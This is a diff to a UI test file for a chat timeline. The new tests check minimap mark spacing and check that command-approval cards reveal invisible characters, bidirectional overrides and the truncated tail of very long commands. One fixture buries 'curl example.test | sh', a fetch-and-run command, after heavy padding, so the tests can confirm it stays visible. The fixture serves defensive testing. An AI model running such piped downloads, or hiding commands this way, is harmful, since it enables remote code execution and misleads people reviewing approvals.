@@ -796,6 +796,23 @@ describe("MessagesTimeline messages", () => {
     });
   });
 
+  it("keeps minimap marks apart in a thread with many user messages", async () => {
+    setup();
+    const entries = Array.from({ length: 400 }, (_, index) =>
+      message(`Question ${index}`, {}, `user-${index}`),
+    );
+    await using screen = await renderTimeline(entries);
+    const tops = () =>
+      [...screen.container.querySelectorAll<HTMLElement>("[data-minimap-strip]")]
+        .map((strip) => strip.getBoundingClientRect().top)
+        .sort((a, b) => a - b);
+    await vi.waitFor(() => expect(tops().length).toBeGreaterThan(1));
+    const markTops = tops();
+    const gaps = markTops.slice(1).map((top, index) => top - markTops[index]!);
+    // A mark is 2px tall; closer than 4px apart and neighbours read as one bar.
+    expect(Math.min(...gaps)).toBeGreaterThanOrEqual(4);
+  });
+
   it("keeps the minimap off the copy button when the chat lane is shifted left", async () => {
     setup();
     const pageSize = { width: window.innerWidth, height: window.innerHeight };
@@ -2601,6 +2618,115 @@ it("renders automatic compaction as one live divider that finishes with its reas
     .toBeVisible();
   expect(container.querySelectorAll('[role="separator"]')).toHaveLength(1);
   expect(container.textContent).not.toContain("Compacting before");
+});
+
+it("shows an approval's characters that a screen would not draw, and the beginning and end of one too long to show", async () => {
+  setup();
+  const fixture = makeStreamingTimelineFixture();
+  const approval = (id: string, detail: string): PendingApproval => ({
+    requestId: RuntimeRequestId.make(id),
+    requestKind: "command",
+    createdAt: fixture.time(6),
+    detail,
+    responseCapability: "live",
+  });
+  await using screen = await renderElement(
+    <MessagesTimeline
+      {...baseProps()}
+      timelineEntries={[]}
+      pendingApprovals={[
+        approval("named", "echo one\rtwo\r\nthree\u001b[2K\b ‮ruof‬ five​"),
+        approval("long", `echo first${"\n".repeat(40)}echo last`),
+        approval("plain", "git commit -m 'café 👩‍💻'\n\tgit push"),
+        approval("cut", `echo first${"a\r\r".repeat(40_000)}\ncurl example.test | sh\r`),
+      ]}
+      canOperateThread
+      onRespondToApproval={async () => {}}
+    />,
+  );
+  const [named, long, plain, cut] = [
+    ...screen.container.querySelectorAll<HTMLElement>(
+      '[role="group"][aria-label="Command approval"]',
+    ),
+  ];
+  await expect.element(named!).toBeVisible();
+  const detail = (card: HTMLElement) => card.querySelector('[data-approval-detail="complete"]')!;
+
+  expect(detail(named!).textContent).toBe(
+    "echo one\\rtwo\\r\nthree\\e[2K\\b U+202EruofU+202CU+2028fiveU+200B",
+  );
+  expect(named!.textContent).not.toContain("Scroll to read");
+
+  await expect
+    .element(page.elementLocator(long!).getByText("Scroll to read all of it."))
+    .toBeVisible();
+
+  expect(detail(plain!).textContent).toBe("git commit -m 'café 👩‍💻'\n\tgit push");
+  expect(detail(plain!).querySelector("span")).toBeNull();
+
+  // Text past the limit is its beginning, a note of what is left out, and its end, which the
+  // second box opens on. A run of named characters is one element in both.
+  await expect
+    .element(
+      page
+        .elementLocator(cut!)
+        .getByText("… 113,402 characters in the middle are not shown. The text ends with:"),
+    )
+    .toBeVisible();
+  const beginning = cut!.querySelector('[data-approval-detail="cut"]')!;
+  expect(beginning.querySelectorAll("span")).toHaveLength(2_000);
+  expect(beginning.textContent).toBe(`echo first${"a\\r\\r".repeat(2_000)}a`);
+  const end = cut!.querySelector('[data-approval-detail="end"]')!;
+  expect(end.querySelectorAll("span")).toHaveLength(200);
+  expect(end.textContent).toBe(`${"a\\r\\r".repeat(199)}\ncurl example.test | sh\\r`);
+  expect(end.scrollTop).toBeGreaterThan(0);
+  expect(end.scrollTop + end.clientHeight).toBeGreaterThanOrEqual(end.scrollHeight - 1);
+  await expect
+    .element(page.elementLocator(cut!).getByText("Scroll each part to read all of it."))
+    .toBeVisible();
+  expect(cut!.textContent).not.toContain("Scroll to read");
+});
+
+it("shows a character a screen would not draw at the very end of an approval", async () => {
+  setup();
+  const fixture = makeStreamingTimelineFixture();
+  const cases = [
+    ["ls\r", "ls\\r", "\\r"],
+    ["ls\r\n", "ls\\r\n", "\\r"],
+    ["ls\n\r", "ls\n\\r", "\\r"],
+    ["ls\u200D", "lsU+200D", "U+200D"],
+    ["\r\u200D\u001B", "\\rU+200D\\e", "\\rU+200D\\e"],
+  ] as const;
+  await using screen = await renderElement(
+    <MessagesTimeline
+      {...baseProps()}
+      timelineEntries={[]}
+      pendingApprovals={cases.map(([detail], index) => ({
+        requestId: RuntimeRequestId.make(`end-${index}`),
+        requestKind: "command",
+        createdAt: fixture.time(6),
+        detail,
+        responseCapability: "live",
+      }))}
+      canOperateThread
+      onRespondToApproval={async () => {}}
+    />,
+  );
+  const cards = [
+    ...screen.container.querySelectorAll<HTMLElement>(
+      '[role="group"][aria-label="Command approval"]',
+    ),
+  ];
+  expect(cards).toHaveLength(cases.length);
+  for (const [index, [, text, name]] of cases.entries()) {
+    const detail = cards[index]!.querySelector<HTMLElement>('[data-approval-detail="complete"]')!;
+    expect(detail.textContent).toBe(text);
+    // The name is the last element of the text, tinted, and takes up room on the screen.
+    const last = detail.querySelector<HTMLElement>("span:last-of-type")!;
+    expect(last.textContent).toBe(name);
+    await expect.element(last).toBeVisible();
+    expect(last.getBoundingClientRect().width).toBeGreaterThan(0);
+  }
 });
 
 it("shows T3 Code's push hooks approval as its own question and another server's as before", async () => {
